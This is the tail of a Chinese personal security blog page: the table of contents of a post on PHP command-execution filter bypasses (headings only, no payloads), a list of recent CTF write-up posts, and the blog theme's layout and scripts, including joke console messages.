class="toc-text">9.uniq：报告或删除文件中重复的行；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-file-f-%E6%8A%A5%E9%94%99%E5%87%BA%E5%85%B7%E4%BD%93%E5%86%85%E5%AE%B9"><span class="toc-text">10.file -f; 报错出具体内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">0x10.编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-base64%E7%BC%96%E7%A0%81"><span class="toc-text">1.base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-base32%E7%BC%96%E7%A0%81"><span class="toc-text">2.base32编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HEX%E7%BC%96%E7%A0%81"><span class="toc-text">3.HEX编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-shellcode%E7%BC%96%E7%A0%81"><span class="toc-text">4.shellcode编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">0x11无回显时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8"><span class="toc-text">命令盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-text">相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-sleep"><span class="toc-text">1.sleep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-awk-NR"><span class="toc-text">2.awk NR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cut-c"><span class="toc-text">3.cut -c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-if%E8%AF%AD%E5%8F%A5"><span class="toc-text">4.if语句</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">0x12长度过滤绕过前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E5%92%8C-%E7%AC%A6%E5%8F%B7"><span class="toc-text">&gt;符号和 &gt;&gt;符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8D%A2%E8%A1%8C"><span class="toc-text">命令换行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ls-t%E5%91%BD%E4%BB%A4"><span class="toc-text">ls -t命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sh"><span class="toc-text">sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E8%BF%90%E7%94%A8"><span class="toc-text">组合运用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dir%E5%8F%8A-%E5%92%8Crev"><span class="toc-text">dir及 *和rev</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13%E9%95%BF%E5%BA%A6%E4%B8%BA7%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">0x13长度为7绕过方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14%E9%95%BF%E5%BA%A6%E4%B8%BA5"><span class="toc-text">0x14长度为5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15%E9%95%BF%E5%BA%A6%E4%B8%BA4"><span class="toc-text">0x15长度为4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">0x16无参数命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%BB%95%E8%BF%87-php7-3"><span class="toc-text">HTTP请求头绕过(php7.3)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x17%E6%97%A0%E5%8F%82%E6%95%B0%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8FRCE-php5-7"><span class="toc-text">0x17无参数全局变量RCE(php5&#x2F;7)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x18%E6%97%A0%E5%8F%82%E6%95%B0session-RCE"><span class="toc-text">0x18无参数session RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-php5"><span class="toc-text">利用session(php5)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89%E4%B8%8E%E6%9C%AC%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%AF%94%E8%BE%83"><span class="toc-text">AAA偷渡阴平（复仇）与本靶场的比较</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x19%E6%97%A0%E5%8F%82%E6%95%B0scandir%E8%AF%BB%E5%8F%96"><span class="toc-text">0x19无参数scandir读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95"><span class="toc-text">当前目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#scandir"><span class="toc-text">scandir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getcwd"><span class="toc-text">getcwd</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95"><span class="toc-text">上级目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-text">根目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nss-Boring-Code"><span class="toc-text">nss  Boring Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97"><span class="toc-text">获得  .</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-text">1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E7%9B%AE%E5%BD%95%E5%B1%82%E7%BA%A7"><span class="toc-text">切换目录层级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84"><span class="toc-text">构造根目录路径</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5"><span class="toc-text">PHP5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7"><span class="toc-text">PHP7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x21%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-text">0x21无字母数字取反绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5-1"><span class="toc-text">PHP5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7-1"><span class="toc-text">PHP7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x22%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="toc-text">0x22无字母数字自增绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5-2"><span class="toc-text">PHP5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7-2"><span class="toc-text">PHP7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x23%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4-php7"><span class="toc-text">0x23无字母数字特殊符号过滤(php7)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-text">无字母数字下划线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%B8%8B%E5%88%92%E7%BA%BF%E5%8F%8A-%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-text">无字母数字下划线及$符号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP7-3"><span class="toc-text">PHP7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP5-3"><span class="toc-text">PHP5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-text">无字母数字过滤;~^&#96;&amp;|</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97-%E5%8F%AA%E8%8E%B7%E5%BE%97%E6%95%B0%E5%AD%97%EF%BC%9F"><span class="toc-text">无字母数字  只获得数字？</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/17001.html" title="第二届VCTF纳新赛web wp"><img src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20251125190644004.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第二届VCTF纳新赛web wp"/></a><div class="content"><a class="title" href="/posts/17001.html" title="第二届VCTF纳新赛web wp">第二届VCTF纳新赛web wp</a><time datetime="2025-11-25T10:58:13.333Z" title="发表于 2025-11-25 18:58:13">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/17000.html" title="第九届封神台Web wp"><img src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20251125190310626.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第九届封神台Web wp"/></a><div class="content"><a class="title" href="/posts/17000.html" title="第九届封神台Web wp">第九届封神台Web wp</a><time datetime="2025-11-25T10:57:02.672Z" title="发表于 2025-11-25 18:57:02">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/TGCTF.html" title="TGCTF web"><img src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250723153452457.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TGCTF web"/></a><div class="content"><a class="title" href="/posts/TGCTF.html" title="TGCTF web">TGCTF web</a><time datetime="2025-08-09T08:53:11.135Z" title="发表于 2025-08-09 16:53:11">2025-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html" title="php命令执行"><img src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250809165008358.gif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php命令执行"/></a><div class="content"><a class="title" href="/posts/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html" title="php命令执行">php命令执行</a><time datetime="2025-08-09T08:52:41.376Z" title="发表于 2025-08-09 16:52:41">2025-08-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/16120.html" title="ctfshow xxe"><img src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250803205146771.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow xxe"/></a><div class="content"><a class="title" href="/posts/16120.html" title="ctfshow xxe">ctfshow xxe</a><time datetime="2025-08-03T12:49:21.514Z" title="发表于 2025-08-03 20:49:21">2025-08-03</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2025 By <a class="footer-bar-link" href="/" title="达达" target="_blank">达达</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">5</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/SSRF/" style="font-size: 0.88rem;">SSRF<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 0.88rem;">XXE<sup>1</sup></a><a href="/tags/ctfshow/" style="font-size: 0.88rem;">ctfshow<sup>3</sup></a><a href="/tags/jwt/" style="font-size: 0.88rem;">jwt<sup>1</sup></a><a href="/tags/phptop10/" style="font-size: 0.88rem;">phptop10<sup>1</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>18</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80/" style="font-size: 0.88rem;">橙子科技<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="switch-commentBarrage" href="javascript:anzhiyu.switchCommentBarrage();" title="开关弹幕"><i class="anzhiyufont anzhiyu-icon-danmu"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("06/10/2025 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2025 By 安知鱼 V1.6.14",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 达达 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script async data-pjax src="/js/imgloaded.js?1"></script><script src="/custom/js/schedule.js"></script><script src="/custom/js/chineselunar.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script><script>//- 留言板页面弹幕
window.addEventListener('load', () => {
  const getnaokuo_danmu = () => {
    if (!window.location.pathname.startsWith('/comments/')) return; //- 判断是否是留言板页面
    const naokuo_danmu = async () => {
      const Danmaku = new EasyDanmaku({
        page: '/comments/', //- 即留言板地址
        el: '#danmu-wrap', //- 弹幕挂载节点
        line: 5, //- 弹幕行数
        speed: 20, //- 弹幕播放速度
        hover: true, //- 鼠标hover时是否暂停播放弹幕
        loop: false, //- 开启循环播放
        colourful: true, //- 开启彩色弹幕
        coefficient: 1.38, //- 弹幕密度系数
        runtime: 10, //- 循环弹幕播放时长
      });
      try {
        let danmuStore = saveToLocal.get('twikoo-danmu');
        if (!danmuStore) {
          const options = {
            method: "POST",
            body: JSON.stringify({
              "event": "GET_RECENT_COMMENTS",
              "includeReply": false,
              "pageSize": 100
            }),
            headers: { 'Content-Type': 'application/json' }
          }
          danmuStore = [];
          const response = await fetch(``, options);
          if (response.ok) {
            const { data } = await response.json();
            //- console.info(data);
            data.forEach(i => {
              if (i.avatar == undefined) i.avatar = 'https://cravatar.cn/avatar/d615d5793929e8c7d70eab5f00f7f5f1?d=mp'
              danmuStore.push({ avatar: i.avatar, content: i.nick + '：' + formatDanmaku(i.comment), url: i.url + '#' + i.id })
            });
            Danmaku.batchSend(danmuStore, true);
            saveToLocal.set('twikoo-danmu', danmuStore, 0.5)
          }
          //- 格式化评论
          function formatDanmaku(str) {
            str = str.replace(/<\/*br>|[\s\uFEFF\xA0]+/g, '');
            str = str.replace(/<img.*?>/g, '[图片]');
            str = str.replace(/<a.*?>.*?<\/a>/g, '[链接]');
            str = str.replace(/<pre.*?>.*?<\/pre>/g, '[代码块]');
            str = str.replace(/<.*?>/g, '');
            return str
          }
        } else {
          Danmaku.batchSend(danmuStore, true);
        }
      } catch (err) {
        console.error("Error fetching data:", err);
      }

